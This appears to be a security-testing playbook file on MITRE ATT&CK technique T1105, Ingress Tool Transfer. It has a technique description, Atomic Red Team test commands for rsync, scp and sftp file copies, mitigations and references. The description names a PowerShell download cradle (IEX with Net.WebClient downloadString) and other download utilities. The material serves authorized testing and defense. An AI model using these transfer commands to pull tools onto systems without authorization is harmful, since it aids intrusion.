---
name: "T1105_ingress-tool-transfer"
description: "Adversaries may transfer tools or other files from an external system into a compromised environment."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1105
  - command-and-control
  - esxi
  - linux
  - macos
  - network-devices
  - windows
technique_id: "T1105"
tactic: "command-and-control"
all_tactics:
  - command-and-control
platforms:
  - ESXi
  - Linux
  - macOS
  - Network Devices
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1105"
tech_stack:
  - esxi
  - linux
  - macos
  - network devices
  - windows
cwe_ids:
  - CWE-300
chains_with: []
prerequisites: []
severity_boost: {}
---

# T1105 Ingress Tool Transfer

## High-Level Description

Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer).

On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`. A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).

Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).

Files can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.

## Kill Chain Phase

- Command and Control (TA0011)

**Platforms:** ESXi, Linux, macOS, Network Devices, Windows

## What to Check

- [ ] Identify if Ingress Tool Transfer technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Ingress Tool Transfer
- [ ] Check Linux systems for indicators of Ingress Tool Transfer
- [ ] Check macOS systems for indicators of Ingress Tool Transfer
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: rsync remote file copy (push)

Utilize rsync to perform a remote file copy (push)

**Supported Platforms:** linux, macos
**Elevation Required:** Yes

```bash
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
```

**Dependencies:**

- rsync must be installed on the machine

### Atomic Test 2: rsync remote file copy (pull)

Utilize rsync to perform a remote file copy (pull)

**Supported Platforms:** linux, macos

```bash
rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
```

**Dependencies:**

- rsync must be installed on the machine

### Atomic Test 3: scp remote file copy (push)

Utilize scp to perform a remote file copy (push)

**Supported Platforms:** linux, macos

```bash
scp #{local_file} #{username}@#{remote_host}:#{remote_path}
```

### Atomic Test 4: scp remote file copy (pull)

Utilize scp to perform a remote file copy (pull)

**Supported Platforms:** linux, macos

```bash
scp #{username}@#{remote_host}:#{remote_file} #{local_path}
```

### Atomic Test 5: sftp remote file copy (push)

Utilize sftp to perform a remote file copy (push)

**Supported Platforms:** linux, macos

```bash
sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Ingress Tool Transfer by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1105 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1031 Network Intrusion Prevention

Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.

### M1037 Filter Network Traffic

Use network filtering to block outbound traffic from compromised systems to unapproved external destinations. Restricting access to known, trusted IP addresses and protocols can prevent attackers from downloading malicious tools or payloads onto compromised servers after gaining initial access.

## Detection

### Detect Ingress Tool Transfers via Behavioral Chain

## Risk Assessment

| Finding                                    | Severity | Impact              |
| ------------------------------------------ | -------- | ------------------- |
| Ingress Tool Transfer technique applicable | High     | Command And Control |

## CWE Categories

| CWE ID  | Title                              |
| ------- | ---------------------------------- |
| CWE-300 | Channel Accessible by Non-Endpoint |

## References

- [T1105: Trellix_search-ms](https://www.trellix.com/blogs/research/beyond-file-search-a-novel-method/)
- [Google Cloud Threat Intelligence COSCMICENERGY 2023](https://cloud.google.com/blog/topics/threat-intelligence/cosmicenergy-ot-malware-russian-response/)
- [Dropbox Malware Sync](https://www.technologyreview.com/2013/08/21/83143/dropbox-and-similar-services-can-sync-malware/)
- [University of Birmingham C2](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)
- [t1105_lolbas](https://lolbas-project.github.io/#t1105)
- [PTSecurity Cobalt Dec 2016](https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-Snatch-eng.pdf)
- [Atomic Red Team - T1105](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1105)
- [MITRE ATT&CK - T1105](https://attack.mitre.org/techniques/T1105)
